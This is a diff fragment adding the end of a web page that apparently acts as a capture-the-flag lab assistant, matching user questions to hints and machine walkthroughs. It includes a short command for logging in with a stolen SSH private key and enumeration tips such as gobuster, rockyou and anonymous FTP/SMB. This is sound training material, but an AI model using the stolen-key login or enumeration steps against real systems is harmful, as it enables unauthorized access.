+ {k:["wordlist","rockyou","where is wordlist","common.txt"],q:"Where the wordlists are",a:"Folders: /usr/share/wordlists/dirb/common.txt and .../dirbuster/directory-list-2.3-medium.txt. Passwords: /usr/share/wordlists/rockyou.txt.gz (unzip with zcat).",c:""},
+ {k:["ssh key","id_rsa","private key","key permissions","ssh -i","permissions too open"],q:"Log in with a stolen SSH key",a:"Save the key, chmod 600 it, then ssh -i. 'Permissions too open' = you forgot chmod 600.",c:R`chmod 600 id_rsa
+ssh -i id_rsa user@{T}`},
+ {k:["stuck","nothing works","cant find","no flag","help","dont know"],q:"Stuck? Reset your approach",a:"Re-check nmap (right port?). Enumerate harder: gobuster with a bigger wordlist + extensions, read robots.txt, try anonymous FTP/SMB. Google the exact service+version for a CVE. Always listener-before-reverse-shell.",c:""},
+];
+const STOP=new Set(["what","whats","is","how","do","does","the","a","an","to","my","of","on","in","for","me","it","are","why","where","which","when","can","could","should","would","i","at","and","or","this","that","with","be","im","was","if","use","using","there","any"]);
+function kbSearch(text){
+ const q=text.toLowerCase();
+ const words=q.split(/[^a-z0-9]+/).filter(w=>w.length>1 && !STOP.has(w));
+ return KB.map(e=>{let s=0; e.k.forEach(k=>{const kl=k.toLowerCase();
+   if(q.includes(kl)) s += kl.includes(" ")?3:2;
+   else kl.split(/[^a-z0-9]+/).forEach(kt=>{ if(kt.length>2 && words.includes(kt)) s+=1; });
+ }); return {e,s};}).filter(x=>x.s>0).sort((a,b)=>b.s-a.s);
+}
+function renderKB(list,res,primary){
+ const h=el('div','headline', primary?'💬 Here is what to do':'💬 Also useful'); h.style.marginTop="16px"; res.append(h);
+ list.forEach((x,i)=>{const e=x.e; const c=el('div','card'+((primary&&i===0)?' pri':''));
+  c.append(el('span','tag t-info','ANSWER'));
+  c.append(el('div','headline',e.q));
+  c.append(el('div','why',sub(e.a)));
+  if(e.c&&e.c.trim()) c.append(term(sub(e.c)));
+  res.append(c);
+ });
+}
+function analyze(){
+  const text=document.getElementById('inp').value;
+  const res=document.getElementById('res'); res.innerHTML="";
+  if(!text.trim()){ res.append(hintCard("Ask me, or paste something","Type a question like 'how do I get root' or 'what is gobuster', paste a command's output, paste a username like uid=995(...), type a port, or an error — I'll tell you what to do.")); return; }
+
+  let hits=RULES.filter(r=>r.re.test(text)).map(r=>({r, score:r.p + (lock&&r.m===lock?500:0)}));
+  hits.sort((a,b)=>b.score-a.score);
+  const mm = hits.find(h=>h.r.m); const detected = lock || (mm&&mm.r.m);
+
+  if(hits.length){
+    const top=hits[0].r;
+    res.append(resultCard(top, true, text));
+    const seen=new Set([top.t]); let shown=0;
+    for(let i=1;i<hits.length && shown<2;i++){ const r=hits[i].r; if(seen.has(r.t)) continue; if(r.kind==='ident'&&detected&&r.m&&r.m!==detected) continue; seen.add(r.t); res.append(resultCard(r,false,text)); shown++; }
+  }
+
+  const hadPorts = renderPortCards(text,res);
+
+  const isQ=/\?|\b(what|whats|how|why|where|which|when|can|could|do|does|is|are|should|explain|meaning|mean|define|help|tell|give)\b/i.test(text) && text.length<240;
+  const kb=kbSearch(text);
+  let shownKB=false;
+  if(kb.length){
+    const strong=kb.filter(x=>x.s>=3);
+    const pick = (isQ || !hits.length) ? (strong.length?strong:kb).slice(0,3) : strong.slice(0,1);
+    if(pick.length){ renderKB(pick, res, !hits.length && !hadPorts); shownKB=true; }
+  }
+
+  if(!hits.length && !hadPorts && !shownKB){ res.append(hintCard("Not sure yet","Try plain words — 'how do I get root', 'what is gobuster', 'reverse shell not working' — or paste a command's output or an open port. Or lock a machine below for its full steps.")); }
+
+  if(detected){ renderFull(detected); setChips(detected); }
+  else renderFull(lock);
+}
+
+function stageWord(text){ if(/hard|\/root\/|uid=0/i.test(text))return"Hard"; if(/inter/i.test(text))return"Intermediate"; if(/easy/i.test(text))return"Easy"; return null; }
+
+function resultCard(r, primary, text){
+  const c=el('div','card'+(primary?' pri':'')+(r.kind==='flag'?' flagcard':'')+(r.kind==='err'?' errcard':''));
+  const tag=el('span','tag '+(r.kt|| (r.m?('t-'+(r.mp||'i')):'t-info')));
+  let label = r.kind==='flag'?'FLAG':r.kind==='err'?'FIX':r.kind==='win'?'ROOT':r.kind==='ident'?'IDENTIFY':'NEXT STEP';
+  tag.textContent=label; c.append(tag);
+  if(r.m){const mc=el('span','mchip',MACHINES[r.m]?MACHINES[r.m].name:r.m);c.append(mc);}
+  let head=r.t; if(r.kind==='flag'){const sw=stageWord(text); if(sw)head="🏁 "+sw+" flag found!";}
+  c.append(el('div','headline',head));
+  if(r.why)c.append(el('div','why',sub(r.why)));
+  if(r.c&&r.c.trim())c.append(term(sub(r.c)));
+  if(r.see){const s=el('div','see');s.append(el('span','k','You should see: '));s.append(document.createTextNode(sub(r.see)));c.append(s);}
+  if(!primary) c.firstChild&&0;
+  return c;
+}
+function hintCard(t,b){const c=el('div','card');c.append(el('div','headline',t));c.append(el('div','why',b));return c;}
+
+/* full steps viewer */
+function renderFull(mid){
+  const body=document.getElementById('fullbody'); body.innerHTML="";
+  if(!mid){ body.textContent="Lock a machine above (or analyze something) to see its full walkthrough here."; return; }
+  const m=MACHINES[mid]; if(!m){body.textContent="";return;}
+  body.append(el('div','headline',m.name+" — full walkthrough"));
+  m.steps.forEach((st,i)=>{
+    const d=el('div','step'); const bar=el('div','b');
+    const bg={e:'b-e',i:'b-i',h:'b-h'}[st.p], tx={e:'EASY',i:'INTER',h:'HARD'}[st.p];
+    bar.append(el('span','badge '+bg,tx)); bar.append(el('h4',null,(i+1)+". "+st.t)); d.append(bar);
+    if(st.d) d.append(el('p',null,st.d));
+    if(st.c) d.append(term(sub(st.c)));
+    if(st.s){const p=el('p',null,"→ "+sub(st.s)); d.append(p);}
+    body.append(d);
+  });
+  document.getElementById('full').open=true;
+}
+
+/* chips */
+function setChips(active){
+  const box=document.getElementById('chips'); box.innerHTML="";
+  const auto=el('button','chip'+(lock===null?' on':''),'Auto-detect'); auto.onclick=()=>{lock=null;setChips();document.getElementById('fullbody').innerHTML='Lock a machine above (or analyze something) to see its full walkthrough here.';}; box.append(auto);
+  MLIST.forEach(([id,nm])=>{const b=el('button','chip'+((lock===id||active===id&&lock===id)?' on':'')+(lock===id?' on':''),nm);b.onclick=()=>{lock=id;setChips(id);renderFull(id);};box.append(b);});
+  // mark lock
+  [...box.children].forEach(ch=>{ if((lock===null&&ch.textContent==='Auto-detect')||(lock&&ch.textContent===(MACHINES[lock]&&MACHINES[lock].name.charAt(0)+MACHINES[lock].name.slice(1).toLowerCase()))) {} });
+}
+
+/* wire up */
+const inp=document.getElementById('inp');
+document.getElementById('goBtn').onclick=analyze;
+inp.addEventListener('input',()=>{ clearTimeout(window._t); window._t=setTimeout(()=>{ if(inp.value.trim().length>3) analyze(); }, 500); });
+const iT=document.getElementById('ipT'),iK=document.getElementById('ipK');
+iT.value=T;iK.value=K;
+iT.oninput=()=>{T=iT.value.trim();try{localStorage.setItem('aT',T);}catch(e){}analyze();};
+iK.oninput=()=>{K=iK.value.trim();try{localStorage.setItem('aK',K);}catch(e){}analyze();};
+setChips();
+</script>
+</body>
+</html>
